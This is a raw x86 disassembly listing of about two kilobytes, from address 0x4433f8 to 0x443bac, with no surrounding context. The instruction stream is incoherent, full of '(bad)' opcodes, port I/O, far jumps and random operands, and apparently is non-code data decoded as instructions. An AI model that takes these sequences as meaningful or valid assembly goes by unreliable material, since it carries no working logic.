  4433f8:	jmp    0x4433f0
  4433fa:	inc    edi
  4433fb:	cmp    al,0x64
  4433fd:	pop    ds
  4433fe:	out    dx,al
  4433ff:	mov    ?,WORD PTR [edi+0x44]
  443402:	push   edi
  443403:	dec    edi
  443404:	or     esi,esp
  443406:	dec    ebp
  443407:	mov    cs,esp
  443409:	ficom  DWORD PTR [ecx-0x5f]
  44340c:	pop    edx
  44340d:	shr    DWORD PTR [ebx+0x6],cl
  443410:	pop    ebx
  443411:	jmp    0x443413
  443413:	sub    esp,DWORD PTR [eax]
  443415:	(bad)  
  443416:	(bad)  
  443417:	in     eax,0x1e
  443419:	jb     0x44345a
  44341b:	int    0x89
  44341d:	pop    es
  44341e:	out    dx,al
  44341f:	fucom  st(5)
  443421:	test   DWORD PTR [ebx+0x71],ebp
  443424:	icebp  
  443425:	icebp  
  443426:	add    DWORD PTR [edx-0x3d9171a1],ebp
  44342c:	xlat   BYTE PTR ds:[ebx]
  44342d:	loopne 0x4433d6
  44342f:	in     al,dx
  443430:	test   al,0xac
  443432:	and    BYTE PTR [ecx-0x219b4a90],0x75
  443439:	(bad)  
  44343a:	aam    0x34
  44343c:	pop    ebp
  44343d:	fisttp DWORD PTR ds:0x737f1507
  443443:	icebp  
  443444:	ds scas eax,DWORD PTR es:[edi]
  443446:	mov    dh,0x9b
  443448:	into   
  443449:	(bad)  
  44344a:	mov    ecx,0x7638de2e
  44344f:	dec    ebx
  443450:	enter  0xee31,0xa5
  443454:	jecxz  0x443401
  443456:	sar    ch,cl
  443458:	cmp    ch,BYTE PTR [edx-0x25]
  44345b:	jmp    0x6164:0x9362752
  443462:	jnp    0x443494
  443464:	sbb    al,0x9
  443466:	sbb    al,0x8
  443468:	call   DWORD PTR [eax-0x11]
  44346b:	dec    esp
  44346c:	sbb    dl,BYTE PTR [ecx-0x2e61ebe5]
  443472:	cwde   
  443473:	dec    ecx
  443474:	test   eax,0x41746860
  443479:	arpl   WORD PTR [eax],di
  44347b:	arpl   WORD PTR ds:0xfedf0154,cx
  443481:	loop   0x443431
  443483:	les    ebp,FWORD PTR [eax+0x1b7ea246]
  443489:	popa   
  44348a:	pop    esi
  44348b:	mov    edi,0x33f75bb7
  443490:	pop    ebx
  443491:	loop   0x44347a
  443493:	pop    eax
  443494:	lea    ebx,[esi+0x62]
  443497:	fisttp DWORD PTR [esi]
  443499:	fs add cl,ah
  44349c:	or     DWORD PTR [ecx+0x31],esp
  44349f:	rcl    bl,0xef
  4434a2:	outs   dx,DWORD PTR ds:[esi]
  4434a3:	and    DWORD PTR [ebx],edi
  4434a5:	sahf   
  4434a6:	out    dx,al
  4434a7:	imul   edx,DWORD PTR [esi+0x22],0xffffffe9
  4434ab:	xor    ch,BYTE PTR [eax+0x26]
  4434ae:	loopne 0x443450
  4434b0:	(bad)  
  4434b2:	mov    bl,0xf7
  4434b4:	dec    esp
  4434b5:	in     al,dx
  4434b6:	sub    al,0xda
  4434b8:	pop    esi
  4434b9:	add    edi,eax
  4434bb:	mov    esi,DWORD PTR [ebx-0x585fc039]
  4434c1:	push   ecx
  4434c2:	sub    esi,DWORD PTR [edi]
  4434c4:	mov    esp,0x50edce0b
  4434c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4434ca:	ins    DWORD PTR es:[edi],dx
  4434cb:	outs   dx,DWORD PTR ds:[esi]
  4434cc:	xor    DWORD PTR [ecx+0x6cef1043],edi
  4434d2:	scas   al,BYTE PTR es:[edi]
  4434d3:	sub    eax,0x19ed2723
  4434d8:	jg     0x44353a
  4434da:	cmc    
  4434db:	jmp    0x44353e
  4434dd:	xor    al,0x49
  4434df:	aam    0x6f
  4434e1:	data16 out dx,al
  4434e3:	jnp    0x4434b2
  4434e5:	xchg   ebp,eax
  4434e6:	jp     0x44349e
  4434e8:	and    BYTE PTR [esi],0xa7
  4434eb:	mov    ds:0xaf7249c3,eax
  4434f0:	mov    edx,0xa329a693
  4434f5:	xchg   edx,eax
  4434f6:	out    dx,al
  4434f7:	xchg   DWORD PTR [edi],edx
  4434f9:	mov    ecx,0x8de36a36
  4434fe:	pusha  
  4434ff:	ins    DWORD PTR es:[edi],dx
  443500:	or     BYTE PTR [ecx-0x11],ah
  443503:	icebp  
  443504:	std    
  443505:	mov    DWORD PTR [edx],0x22983ce1
  44350b:	add    al,0x97
  44350d:	pusha  
  44350e:	mov    bh,0x27
  443510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443511:	adc    cl,ah
  443513:	enter  0xb15f,0x18
  443517:	mov    al,ds:0xced64e75
  44351c:	push   ds
  44351d:	lahf   
  44351e:	xor    edx,ebp
  443520:	dec    ebp
  443521:	(bad)  
  443522:	out    dx,al
  443523:	push   edi
  443524:	mul    DWORD PTR [esi]
  443526:	mov    ebx,ecx
  443528:	lahf   
  443529:	add    ecx,edx
  44352b:	fsubr  DWORD PTR [eax]
  44352d:	fsubr  st,st(6)
  44352f:	inc    edi
  443530:	sub    eax,0xd20783a2
  443535:	sub    dh,ch
  443537:	popa   
  443538:	push   eax
  443539:	sbb    eax,0xb9864048
  44353e:	shl    BYTE PTR [eax+0x4fb3b4fe],1
  443544:	dec    esi
  443545:	jbe    0x4434f2
  443547:	sbb    eax,0x9ab8875b
  44354c:	mov    WORD PTR [edx+0x6e],es
  44354f:	call   0x695:0xa19fea5f
  443556:	push   0x761ddef8
  44355b:	inc    ebx
  44355c:	push   ecx
  44355d:	sbb    esp,DWORD PTR ds:0x41709ed2
  443563:	imul   esi,ecx,0xa6a0fa72
  443569:	jno    0x44355f
  44356b:	js     0x44354c
  44356d:	add    al,0xec
  44356f:	push   ds
  443570:	pop    esi
  443571:	push   es
  443572:	mov    ds:0x29b003dc,al
  443577:	jo     0x44355a
  443579:	pusha  
  44357a:	daa    
  44357b:	xchg   edx,eax
  44357c:	sbb    BYTE PTR [ebp-0x17],ch
  44357f:	scas   al,BYTE PTR es:[edi]
  443580:	das    
  443581:	xor    al,0xee
  443583:	hlt    
  443584:	int    0xf4
  443586:	inc    ecx
  443587:	adc    DWORD PTR [ecx],esp
  443589:	push   es
  44358a:	ffreep st(4)
  44358c:	mov    eax,0xc0a7b49a
  443591:	inc    edx
  443592:	jecxz  0x443544
  443594:	mov    bh,0xc
  443596:	xchg   esi,eax
  443597:	out    dx,al
  443598:	pop    esi
  443599:	int3   
  44359a:	inc    esi
  44359b:	jb     0x443531
  44359d:	jo     0x443583
  44359f:	push   ebp
  4435a0:	dec    edi
  4435a1:	popa   
  4435a2:	inc    ebp
  4435a3:	sub    edi,DWORD PTR [ebx+0x6f4a8c3]
  4435a9:	push   0x4480d9ef
  4435ae:	fs xchg ebp,eax
  4435b0:	sbb    DWORD PTR [eax],0xffffff9d
  4435b3:	mov    eax,ds:0x403b8473
  4435b8:	mov    DWORD PTR [eax-0x69076088],edi
  4435be:	enter  0x7f31,0x13
  4435c2:	and    DWORD PTR [ecx-0xe586f52],edi
  4435c8:	xor    eax,0xd3a8cd47
  4435cd:	pusha  
  4435ce:	fistp  DWORD PTR [eax]
  4435d0:	pop    ebp
  4435d1:	xchg   ebp,eax
  4435d2:	call   0x7eef:0xc6616576
  4435d9:	mov    edx,0x4aabda7b
  4435de:	out    dx,al
  4435df:	sbb    al,0xc8
  4435e1:	xor    BYTE PTR [edx+0x374fd347],al
  4435e7:	xchg   esp,eax
  4435e8:	cmp    al,0xf1
  4435ea:	sbb    BYTE PTR [ecx+0x5a57aece],ah
  4435f0:	loop   0x4435e4
  4435f2:	out    0x8a,eax
  4435f4:	inc    esp
  4435f5:	inc    ecx
  4435f6:	jns    0x4435bd
  4435f8:	jle    0x443621
  4435fa:	jle    0x4435c5
  4435fc:	das    
  4435fd:	jne    0x4435bd
  4435ff:	stos   DWORD PTR es:[edi],eax
  443600:	jnp    0x44365e
  443602:	add    eax,0x9de13215
  443607:	push   ecx
  443608:	outs   dx,DWORD PTR ds:[esi]
  443609:	ins    BYTE PTR es:[edi],dx
  44360a:	out    dx,eax
  44360b:	push   cs
  44360c:	hlt    
  44360d:	add    DWORD PTR [eax+0x1],esp
  443610:	imul   ebx,eax,0x60d15af1
  443616:	mov    cl,0x29
  443618:	or     BYTE PTR ds:0x3ab3b65a,0xee
  44361f:	lea    eax,[ebp+0x2410d2d4]
  443625:	jecxz  0x44364f
  443627:	mov    ds:0xb4123e4f,al
  44362c:	adc    al,bh
  44362e:	mov    dl,0x54
  443630:	adc    eax,0x2315eefd
  443635:	xchg   BYTE PTR [esi+ebp*8],ch
  443638:	jmp    0x7ce4cf05
  44363d:	xchg   esp,eax
  44363e:	pop    eax
  44363f:	mov    dh,0x5e
  443641:	pop    es
  443642:	sti    
  443643:	shl    DWORD PTR [edi-0x1cba114f],cl
  443649:	call   0xcba451d0
  44364e:	add    cl,dh
  443650:	fstp   QWORD PTR [edi-0x56]
  443653:	dec    ecx
  443654:	sar    BYTE PTR [esi-0x40],1
  443657:	pop    edi
  443658:	inc    ebx
  443659:	mov    eax,ds:0xcbec93b5
  44365e:	out    dx,al
  44365f:	sbb    al,0x76
  443661:	jne    0x44364c
  443663:	cmp    ecx,eax
  443665:	scas   eax,DWORD PTR es:[edi]
  443666:	je     0x443609
  443668:	xchg   DWORD PTR [edx],edx
  44366a:	test   al,0x4f
  44366c:	cli    
  44366d:	stos   BYTE PTR es:[edi],al
  44366e:	sub    dl,bl
  443670:	pop    esi
  443671:	or     eax,0xdb46cf6e
  443676:	adc    esp,0xa192b344
  44367c:	mov    ebx,0x795eae28
  443681:	xor    eax,0x5e42cf
  443686:	mov    ebp,0x8eb615ab
  44368b:	sbb    al,0xfd
  44368d:	pop    edi
  44368e:	fdiv   DWORD PTR [edx]
  443690:	push   edx
  443691:	and    cl,BYTE PTR [ebx-0x5d]
  443694:	in     eax,dx
  443695:	mov    al,ds:0xdb5e1d42
  44369a:	jmp    0x54d4e469
  44369f:	aas    
  4436a0:	mov    DWORD PTR [ebp+0x23],edx
  4436a3:	pop    ecx
  4436a4:	scas   eax,DWORD PTR es:[edi]
  4436a5:	mov    ds:0xd15d3967,eax
  4436aa:	mov    eax,ds:0xee5dba3a
  4436af:	mov    esi,0x77a5cea3
  4436b4:	paddusw mm1,QWORD PTR [esi]
  4436b7:	mov    eax,ds:0x28a8f704
  4436bc:	push   0xffffffae
  4436be:	fmul   st,st(1)
  4436c0:	ins    BYTE PTR es:[edi],dx
  4436c1:	mov    al,ds:0x497aceee
  4436c6:	pusha  
  4436c7:	xor    al,0x57
  4436c9:	dec    eax
  4436ca:	mov    esi,0xab77efa0
  4436cf:	jmp    0x92bf4647
  4436d4:	xor    eax,0x8321427a
  4436d9:	stos   BYTE PTR es:[edi],al
  4436da:	pop    esi
  4436db:	mov    ds:0x8502e69e,al
  4436e0:	js     0x44373f
  4436e2:	idiv   ch
  4436e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4436e5:	fmul   st(5),st
  4436e7:	and    DWORD PTR [esi+0x35401ee1],esi
  4436ed:	mov    ah,0xd0
  4436ef:	and    dl,ch
  4436f1:	daa    
  4436f2:	out    dx,eax
  4436f3:	pushf  
  4436f4:	inc    edx
  4436f5:	cld    
  4436f6:	push   esp
  4436f7:	mov    eax,ds:0xaa1021a6
  4436fc:	mov    edi,DWORD PTR [eax+0x6a]
  4436ff:	push   edx
  443700:	pop    esi
  443701:	mov    ch,0x2a
  443703:	retf   
  443704:	out    0x9,eax
  443706:	sub    al,0xd3
  443708:	and    ah,BYTE PTR [edi+0x1f]
  44370b:	and    al,0xde
  44370d:	push   esi
  44370e:	dec    esi
  44370f:	sbb    DWORD PTR [esi+esi*2+0x4234d6dc],0x32
  443717:	and    esi,ebp
  443719:	mov    ebx,DWORD PTR [edx+0x3b4e0b0a]
  44371f:	imul   ebx,DWORD PTR [ecx+0x61],0x2b87b11
  443726:	xchg   edx,eax
  443727:	rol    ch,0x2c
  44372a:	out    dx,al
  44372b:	and    edx,DWORD PTR [esi]
  44372d:	pop    edi
  44372e:	mov    ebp,0x8a148394
  443733:	(bad)  
  443734:	push   edx
  443735:	icebp  
  443736:	ja     0x4436d9
  443738:	adc    bh,ah
  44373a:	mov    eax,0xe790f291
  44373f:	repz dec ecx
  443741:	in     al,0xd4
  443743:	popa   
  443744:	ds inc edx
  443746:	add    al,0x3d
  443748:	mov    eax,DWORD PTR [eax]
  44374a:	xchg   edx,eax
  44374b:	xchg   ebx,eax
  44374c:	inc    ebx
  44374d:	popa   
  44374e:	or     DWORD PTR [edi+0x78],ebx
  443751:	push   0xfffffff7
  443753:	fld    DWORD PTR [edi+0x44]
  443756:	out    dx,al
  443757:	hlt    
  443758:	or     DWORD PTR [esi+0x7],ebx
  44375b:	test   dh,0x26
  44375e:	push   eax
  44375f:	call   0x2b5e:0x668ae74a
  443766:	not    bl
  443768:	call   0xe3db:0x6f93ee98
  44376f:	or     DWORD PTR [ecx-0x6c5e9c76],0x604c2b21
  443779:	mov    bl,0xa2
  44377b:	cld    
  44377c:	push   edx
  44377d:	adc    al,0x9c
  44377f:	pop    edx
  443780:	sahf   
  443781:	sbb    cl,BYTE PTR [ebp+eiz*1+0x6d]
  443785:	nop
  443786:	pop    edx
  443787:	mov    eax,ds:0xea7e51ed
  44378c:	add    eax,0x80b69ae4
  443791:	inc    ecx
  443792:	and    DWORD PTR [ebx],edi
  443794:	in     al,0x74
  443796:	fsubr  DWORD PTR [edx]
  443798:	pop    ebp
  443799:	gs adc al,0x3f
  44379c:	aad    0x39
  44379e:	fidivr WORD PTR [ebp+0x3b]
  4437a1:	popa   
  4437a2:	xchg   ebp,eax
  4437a3:	pop    esi
  4437a4:	dec    ebx
  4437a5:	cmc    
  4437a6:	inc    edx
  4437a7:	jmp    0x35330286
  4437ac:	or     edi,DWORD PTR [edx+0x4c6891a2]
  4437b2:	or     BYTE PTR [edx+esi*2+0xd8bce04],ah
  4437b9:	int3   
  4437ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4437bb:	adc    ebx,DWORD PTR [ebx]
  4437bd:	mov    ah,0xed
  4437bf:	pop    es
  4437c0:	ja     0x443827
  4437c2:	mov    al,0x97
  4437c4:	jl     0x4437c0
  4437c6:	push   edx
  4437c7:	fisub  WORD PTR [ebp+0xd335b60]
  4437cd:	and    eax,0x1ed24381
  4437d2:	add    DWORD PTR [ebp+0x15],ebx
  4437d5:	jo     0x443845
  4437d7:	sub    BYTE PTR [edx-0x19],bh
  4437da:	fisub  DWORD PTR [ebp-0x73]
  4437dd:	pop    edi
  4437de:	xchg   ebp,eax
  4437df:	jne    0x44378c
  4437e1:	repnz dec esi
  4437e3:	mov    BYTE PTR [ebx+0x5e53158c],cl
  4437e9:	and    dl,cl
  4437eb:	rcr    ecx,cl
  4437ed:	jecxz  0x4437df
  4437ef:	rol    DWORD PTR [ebx+ebx*2-0x68e79f6b],0x4b
  4437f7:	and    edi,edi
  4437f9:	jns    0x44377e
  4437fb:	cmp    BYTE PTR [esi-0x26],bl
  4437fe:	mov    BYTE PTR [edi-0x62311480],ah
  443804:	jmp    0x44016569
  443809:	mov    ebx,0xf27d4687
  44380e:	jmp    0x44388b
  443810:	lahf   
  443811:	(bad)  
  443812:	xor    al,0xd8
  443814:	je     0x4437c6
  443816:	lods   eax,DWORD PTR ds:[esi]
  443817:	imul   ebx,DWORD PTR [eax-0x4b12b0a0],0xe9eb0b97
  443821:	cmp    esi,ebp
  443823:	or     ah,ah
  443825:	and    BYTE PTR [edi+0x2a],0x19
  443829:	mov    BYTE PTR [bx+0x7aaf],bl
  44382e:	pop    ds
  44382f:	cli    
  443830:	jle    0x4437f1
  443832:	(bad)  
  443833:	out    0x6f,al
  443835:	into   
  443836:	out    0x2b,eax
  443838:	sahf   
  443839:	cmp    eax,0xc24e2698
  44383e:	or     eax,0xe61a216
  443843:	pushf  
  443844:	(bad)  
  443846:	ret    0x157e
  443849:	add    dh,BYTE PTR [ecx-0x76]
  44384c:	pop    esi
  44384d:	dec    ebx
  44384e:	mov    esp,DWORD PTR ds:0x65880adf
  443854:	mov    ds:0x819eef60,eax
  443859:	sbb    BYTE PTR [edi-0x56],al
  44385c:	xchg   esp,eax
  44385d:	mov    bh,0xee
  44385f:	push   es
  443860:	and    eax,0x1cd0f973
  443865:	in     eax,0x12
  443867:	mov    eax,ds:0x7ce0a3f1
  44386c:	mov    dh,0x62
  44386e:	jl     0x4438af
  443870:	pop    esi
  443871:	nop
  443872:	mov    eax,0x66714db6
  443877:	retf   
  443878:	pop    ebx
  443879:	mov    ecx,0xf27a0bb
  44387e:	cmp    DWORD PTR [ebx],ebp
  443880:	jno    0x443817
  443882:	dec    esi
  443883:	and    al,0x5b
  443885:	mov    eax,0x35039db
  44388a:	dec    BYTE PTR [eax+ebx*4-0x685b92ce]
  443891:	xor    al,0x74
  443893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443894:	loopne 0x44387b
  443896:	jnp    0x4438f4
  443898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443899:	scas   al,BYTE PTR es:[edi]
  44389a:	nop
  44389b:	mov    ds:0x26d1305d,al
  4438a0:	push   edi
  4438a1:	inc    eax
  4438a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4438a3:	sub    eax,0xa193c9a2
  4438a8:	ins    BYTE PTR es:[edi],dx
  4438a9:	aaa    
  4438aa:	pop    ds
  4438ab:	sbb    DWORD PTR [edi-0x1],ebp
  4438ae:	das    
  4438af:	jg     0x44389e
  4438b1:	mov    ds:0x3aa2f4eb,al
  4438b6:	cmp    DWORD PTR [ebx+ebp*8+0x27922e94],ecx
  4438bd:	cmp    ch,bh
  4438bf:	out    dx,eax
  4438c0:	mov    ah,0x60
  4438c2:	idiv   DWORD PTR [ebx-0xd]
  4438c5:	mov    bh,0x9c
  4438c7:	or     al,0x3a
  4438c9:	inc    esi
  4438ca:	lock retf 0xe3f0
  4438ce:	xchg   esp,eax
  4438cf:	loopne 0x44387a
  4438d1:	shl    BYTE PTR [edi],0xfc
  4438d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4438d5:	sbb    BYTE PTR [ecx+eiz*4],bh
  4438d8:	xor    DWORD PTR [edi-0x18],esi
  4438db:	stc    
  4438dc:	cmp    eax,0x5e34aaf6
  4438e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4438e2:	fiadd  WORD PTR [edx]
  4438e4:	jne    0x4438b5
  4438e6:	ret    0xa84
  4438e9:	daa    
  4438ea:	add    esi,ebp
  4438ec:	fisub  DWORD PTR [eax+0x3d]
  4438ef:	mov    ebx,0x97b3385f
  4438f4:	popf   
  4438f5:	cmp    al,dh
  4438f7:	xor    dh,BYTE PTR [eax-0x39]
  4438fa:	mov    ds:0xf560b39f,al
  4438ff:	pop    esp
  443900:	in     eax,0x5c
  443902:	dec    edi
  443903:	mov    eax,ds:0xb4597fa0
  443908:	push   ebx
  443909:	popf   
  44390a:	add    bl,BYTE PTR [eax]
  44390c:	pop    esi
  44390d:	xchg   BYTE PTR ds:0xb463d058,bl
  443913:	pop    edi
  443914:	ds pop edx
  443916:	xor    al,0x30
  443918:	push   ecx
  443919:	sub    edx,DWORD PTR [edx]
  44391b:	ret    0xa1e3
  44391e:	pop    es
  44391f:	test   DWORD PTR [eax],esi
  443921:	out    dx,al
  443922:	out    dx,al
  443923:	inc    esi
  443924:	adc    DWORD PTR [ecx+edx*2],esi
  443927:	mov    ebx,0xa52920a6
  44392c:	xchg   edx,eax
  44392d:	push   esp
  44392e:	add    DWORD PTR [edi+0x4b1fa0ff],ebx
  443934:	mov    edx,0x5206f197
  443939:	xor    al,0xfd
  44393b:	mov    esp,0x384c76db
  443940:	push   ds
  443941:	icebp  
  443942:	dec    ecx
  443943:	fdiv   st,st(5)
  443945:	pop    ss
  443946:	out    dx,al
  443947:	cdq    
  443948:	push   ebp
  443949:	dec    edx
  44394a:	adc    edi,ecx
  44394c:	mov    bh,0xc1
  44394e:	retf   0xe6a1
  443951:	iret   
  443952:	hlt    
  443953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443954:	dec    edi
  443955:	cs (bad) 
  443957:	dec    esp
  443958:	loop   0x44392b
  44395a:	lock fs mov dl,0x18
  44395e:	scas   eax,DWORD PTR es:[edi]
  44395f:	and    al,0x99
  443961:	adc    eax,0xa87bc62b
  443966:	aam    0xb8
  443968:	pop    ebp
  443969:	popa   
  44396a:	jnp    0xc179e139
  443970:	loope  0x4438f4
  443972:	out    dx,al
  443973:	in     eax,0x81
  443975:	and    esi,esp
  443977:	aas    
  443978:	cmp    ch,ah
  44397a:	push   ebp
  44397b:	mov    ds:0x782205bd,al
  443980:	or     eax,0xdf853908
  443985:	xor    dh,ch
  443987:	stos   BYTE PTR es:[edi],al
  443988:	cld    
  443989:	sbb    esp,0xffffffe8
  44398c:	sbb    BYTE PTR [ecx-0x7d],ah
  44398f:	mov    dh,0xa5
  443991:	inc    esp
  443992:	adc    DWORD PTR [eax-0x7f0c084d],0xa11f7e2c
  44399c:	fwait
  44399d:	std    
  44399e:	xor    al,0xbf
  4439a0:	add    al,0x61
  4439a2:	pop    ss
  4439a3:	test   BYTE PTR [esi+eax*2],bl
  4439a6:	iret   
  4439a7:	leave  
  4439a8:	ja     0x4439b6
  4439aa:	out    dx,al
  4439ab:	int3   
  4439ac:	and    bh,BYTE PTR [ebx+0x727481ea]
  4439b2:	cmp    esp,DWORD PTR [ecx-0x37b56830]
  4439b8:	lfs    edi,FWORD PTR [ebp+0x54666ac2]
  4439bf:	pop    ebp
  4439c0:	arpl   WORD PTR [esi],bp
  4439c2:	adc    ebp,ecx
  4439c4:	mov    ah,BYTE PTR [eax]
  4439c6:	adc    al,0x8c
  4439c8:	fadd   st(0),st
  4439ca:	nop
  4439cb:	mov    eax,ds:0xf1a39624
  4439d0:	mov    esp,0x64540cf3
  4439d5:	fwait
  4439d6:	pop    esp
  4439d7:	repnz cmp al,BYTE PTR [esi+ebp*1]
  4439db:	push   eax
  4439dc:	mov    dl,0xd7
  4439de:	or     ebx,ebp
  4439e0:	dec    esi
  4439e1:	popa   
  4439e2:	xor    al,0x76
  4439e4:	xchg   edi,eax
  4439e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4439e6:	nop
  4439e7:	inc    ebx
  4439e8:	lea    eax,[edi]
  4439ea:	adc    ch,BYTE PTR [ebp-0xe13817b]
  4439f0:	scas   eax,DWORD PTR es:[edi]
  4439f1:	adc    BYTE PTR [ebx-0x1f],ch
  4439f4:	lds    ecx,FWORD PTR [edx]
  4439f6:	in     eax,0x78
  4439f8:	mov    dl,0x59
  4439fa:	xchg   esi,eax
  4439fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4439fc:	xor    al,0xed
  4439fe:	scas   al,BYTE PTR es:[edi]
  4439ff:	mov    al,0x93
  443a01:	mov    BYTE PTR [eax+0xd],cl
  443a04:	dec    edx
  443a05:	(bad)  
  443a07:	outs   dx,BYTE PTR ds:[esi]
  443a08:	lods   al,BYTE PTR ds:[esi]
  443a09:	pusha  
  443a0a:	xor    eax,0x1c66ab6a
  443a0f:	pop    eax
  443a10:	mov    edx,0x51bb4559
  443a15:	fstp   TBYTE PTR [eax]
  443a17:	push   ecx
  443a18:	into   
  443a19:	xor    esi,DWORD PTR [ebp-0x22]
  443a1c:	lock add ah,BYTE PTR gs:[esi]
  443a20:	adc    esi,edi
  443a22:	outs   dx,BYTE PTR ds:[esi]
  443a23:	xor    ebp,DWORD PTR [ecx+0x791b3b93]
  443a29:	pusha  
  443a2a:	and    DWORD PTR ds:0x58411e7e,ebp
  443a30:	and    DWORD PTR [eax-0x12],ebp
  443a33:	xor    BYTE PTR [ebp+esi*2+0x5e],0x2
  443a38:	repz les edx,FWORD PTR [ecx+0x5c5c108e]
  443a3f:	loope  0x443a7f
  443a41:	mov    bh,0x18
  443a43:	xchg   esp,eax
  443a44:	dec    esp
  443a45:	rcr    bl,cl
  443a47:	cli    
  443a48:	jbe    0x443a4c
  443a4a:	out    dx,al
  443a4b:	and    DWORD PTR [ebx+0x6d],0xa6ac89a2
  443a52:	sub    BYTE PTR [ecx+0x62f076f5],ah
  443a58:	cld    
  443a59:	jg     0x443a05
  443a5b:	add    al,0x5e
  443a5d:	add    DWORD PTR [eax+eiz*8+0x7c],edi
  443a61:	lods   eax,DWORD PTR ds:[esi]
  443a62:	in     al,dx
  443a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443a64:	adc    BYTE PTR [ecx-0xe],ah
  443a67:	xlat   BYTE PTR ds:[ebx]
  443a68:	xchg   ebx,eax
  443a69:	mov    DWORD PTR ds:0xee44f1f3,edi
  443a6f:	scas   al,BYTE PTR es:[edi]
  443a70:	mov    dh,0x79
  443a72:	popa   
  443a73:	loop   0x443adf
  443a75:	out    dx,al
  443a76:	mov    eax,0xeda092a0
  443a7b:	mov    ecx,DWORD PTR [edi+eax*2+0x2a]
  443a7f:	imul   ebx,DWORD PTR [esi+0xf],0x432f34f5
  443a86:	fs inc esi
  443a88:	and    DWORD PTR [eax-0x7a],0xa14986ef
  443a8f:	loopne 0x443ae8
  443a91:	sahf   
  443a92:	out    dx,al
  443a93:	test   ebp,0xfde86be5
  443a99:	jmp    0x443a3b
  443a9b:	mov    eax,ds:0xab58aef9
  443aa0:	cmc    
  443aa1:	call   0xcf15:0xd85fb359
  443aa8:	inc    eax
  443aa9:	sbb    ebx,DWORD PTR [ecx]
  443aab:	cmp    DWORD PTR [edx+0x3],0x23e9a0c3
  443ab2:	or     ecx,eax
  443ab4:	test   eax,0x5e5bfeaf
  443ab9:	cdq    
  443aba:	pusha  
  443abb:	jecxz  0x443a8a
  443abd:	pop    ds
  443abe:	mov    bl,ch
  443ac0:	push   0x60
  443ac2:	in     eax,dx
  443ac3:	jecxz  0x443aa9
  443ac5:	hlt    
  443ac6:	push   0x54281737
  443acb:	popf   
  443acc:	pop    esi
  443acd:	sbb    al,al
  443acf:	cmp    eax,0xe6a0347b
  443ad4:	outs   dx,BYTE PTR ds:[esi]
  443ad5:	pusha  
  443ad6:	sbb    eax,0x48cb0754
  443adb:	enter  0xf7f5,0xee
  443adf:	jae    0x443abc
  443ae1:	fidiv  DWORD PTR [edx+ebx*4-0xb647f10]
  443ae8:	hlt    
  443ae9:	push   edx
  443aea:	pop    ebp
  443aeb:	aas    
  443aec:	(bad)  
  443aed:	in     eax,0xee
  443aef:	aad    0x7a
  443af1:	das    
  443af2:	pop    ds
  443af3:	scas   al,BYTE PTR es:[edi]
  443af4:	pop    esi
  443af5:	sbb    esi,DWORD PTR [ecx+0x30ce7116]
  443afb:	mov    ebx,0xc1025175
  443b00:	jmp    0x5fe3fbbb
  443b05:	mov    ds:0xedde06b0,al
  443b0a:	mov    ah,0xdc
  443b0c:	inc    eax
  443b0d:	pop    ds
  443b0e:	out    dx,al
  443b0f:	nop
  443b10:	lods   al,BYTE PTR ds:[esi]
  443b11:	popf   
  443b12:	leave  
  443b13:	push   eax
  443b14:	add    bl,ch
  443b16:	inc    esi
  443b17:	mov    eax,ds:0x85bb5a2c
  443b1c:	pop    edi
  443b1d:	xor    DWORD PTR [esi],eax
  443b1f:	jo     0x443b2f
  443b21:	xchg   esp,eax
  443b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443b23:	lds    ebx,FWORD PTR [esi-0x56]
  443b26:	jb     0x443afe
  443b28:	mov    BYTE PTR [ecx],dh
  443b2a:	scas   eax,DWORD PTR es:[edi]
  443b2b:	jb     0x443aad
  443b2d:	pusha  
  443b2e:	adc    cl,cl
  443b30:	aam    0xaa
  443b32:	jo     0x443b25
  443b34:	fld    TBYTE PTR [edx]
  443b36:	out    dx,eax
  443b37:	mov    ah,0xd6
  443b39:	pop    esp
  443b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443b3b:	loopne 0x443b83
  443b3d:	xchg   edx,eax
  443b3e:	ffreep st(5)
  443b40:	and    DWORD PTR [ecx-0x55],esp
  443b43:	sub    eax,0xfdbeecd9
  443b48:	and    BYTE PTR [ebp-0x12],0x1e
  443b4c:	mov    ds:0x268cc44d,al
  443b51:	mov    ds:0xb82da13a,eax
  443b56:	sbb    DWORD PTR [ecx+0x695e0a22],eax
  443b5c:	pop    esi
  443b5d:	push   ds
  443b5e:	xor    al,0xe2
  443b60:	retf   0xdae3
  443b63:	test   DWORD PTR [ebp+0x59],esi
  443b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443b67:	pop    ebp
  443b68:	sbb    DWORD PTR ds:0xc4de8ee4,esi
  443b6e:	jnp    0x443b16
  443b70:	lods   al,BYTE PTR ds:[esi]
  443b71:	cwde   
  443b72:	fisub  DWORD PTR ds:0x96024d52
  443b78:	pop    ebx
  443b79:	and    DWORD PTR [eax-0x42],edx
  443b7c:	mov    ?,WORD PTR [ebp+0x524eb789]
  443b82:	shl    DWORD PTR [eax+0x48],cl
  443b85:	pusha  
  443b86:	scas   al,BYTE PTR es:[edi]
  443b87:	jmp    0x443bcd
  443b89:	jmp    0xf1ab8021
  443b8e:	test   al,0xda
  443b90:	jo     0x443bf1
  443b92:	cmp    al,0xcc
  443b94:	(bad)  
  443b95:	push   edx
  443b96:	sub    ch,BYTE PTR [eax+eiz*2+0x2e]
  443b9a:	push   0x13d6d5a1
  443b9f:	mov    al,0xca
  443ba1:	stos   DWORD PTR es:[edi],eax
  443ba2:	ret    0xaed2
  443ba5:	add    al,0xf0
  443ba7:	data16 outs dx,BYTE PTR ds:[esi]
  443ba9:	daa    
  443baa:	mov    bh,0x80
  443bac:	daa    
